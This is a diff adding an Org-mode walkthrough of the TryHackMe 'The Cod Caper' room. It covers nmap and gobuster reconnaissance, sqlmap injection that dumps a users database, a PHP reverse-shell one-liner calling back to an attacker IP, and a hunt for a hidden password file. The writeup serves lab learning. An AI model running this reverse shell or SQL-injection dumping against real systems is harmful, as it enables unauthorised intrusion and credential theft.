@@ -1,0 +1,83 @@
+#+TITLE: TryHackMe - The Cod Caper writeup
+
+https://tryhackme.com/room/thecodcaper
+
+* Scanning & Reconnaissance
+
+	#+begin_src shell
+		nmap -p 22,80 -sC -sV -vv 10.10.78.247
+
+		PORT   STATE SERVICE REASON  VERSION
+		22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+		| ssh-hostkey:
+		|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+		| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
+		|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+		| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
+		|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+		|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
+		80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+		| http-methods:
+		|_  Supported Methods: OPTIONS GET HEAD POST
+		|_http-server-header: Apache/2.4.18 (Ubuntu)
+		|_http-title: Apache2 Ubuntu Default Page: It works
+		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	#+end_src
+
+* Enumerating Services
+
+	As usual, enumerating common directories, file names and extensions on the website.
+
+	#+begin_src shell
+		gobuster dir -u http://10.10.78.247/ -w /usr/share/wordlists/dirb/common.txt -x php
+
+		/.hta                 (Status: 403) [Size: 277]
+		/.hta.php             (Status: 403) [Size: 277]
+		/.htaccess            (Status: 403) [Size: 277]
+		/.htpasswd            (Status: 403) [Size: 277]
+		/.htaccess.php        (Status: 403) [Size: 277]
+		/.htpasswd.php        (Status: 403) [Size: 277]
+		/administrator.php    (Status: 200) [Size: 409]
+		/index.html           (Status: 200) [Size: 10918]
+		/server-status        (Status: 403) [Size: 277]
+	#+end_src
+
+	Let's take a look at 'administrator.php'!
+
+* Web Exploitation
+
+	#+begin_src shell
+		sqlmap -u http://10.10.78.247/administrator.php --forms --batch --risk 1 --level 1
+		sqlmap -u http://10.10.193.208/administrator.php --forms --batch --dump -D users
+	#+end_src
+
+* Command Execution
+
+	 After login with credentials found via SQLI, we are presented with a form giving the ability to run commands. Let's start netcat and access it with the command below:
+
+	 #+begin_src php
+ php -r '$sock=fsockopen("10.9.1.137",3333);exec("/bin/sh -i <&3 >&3 2>&3");'
+	 #+end_src
+
+	 #+begin_src shell
+		 nc -lvnp 3333
+
+		 listening on [any] 3333 ...
+		 connect to [10.9.1.137] from (UNKNOWN) [10.10.193.208] 45244
+		 /bin/sh: 0: can't access tty; job control turned off
+		 $ id
+		 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+		 #+end_src
+
+		 Let's search for *hidden* files...
+
+	 #+begin_src shell
+		 $ find / -name hidden 2>/dev/null
+		 /var/hidden
+		 $ find /var/hidden
+		 /var/hidden
+		 /var/hidden/pass
+		 $ cat /var/hidden/pass
+	 #+end_src
+
+* LinEnum
